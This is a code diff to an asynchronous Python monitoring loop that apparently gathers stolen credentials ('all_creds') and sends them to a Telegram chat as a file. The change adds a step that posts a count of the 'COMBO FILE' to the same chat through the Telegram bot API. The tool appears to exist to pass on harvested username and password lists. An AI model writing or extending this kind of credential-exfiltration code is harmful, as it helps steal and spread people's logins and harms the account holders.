@@ -370,6 +370,14 @@ async def monitor_loop():
                         )
                         await send_telegram_file(tg_header + "\n".join(all_creds), filename)
 
+                        # Send combo count message
+                        count_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+                        async with aiohttp.ClientSession() as sess:
+                            await sess.post(count_url, json={
+                                "chat_id": TELEGRAM_CHAT,
+                                "text": f"{len(all_creds)} COMBO FILE"
+                            })
+
                     else:
                         log.info("Nothing to post to content channel")
 
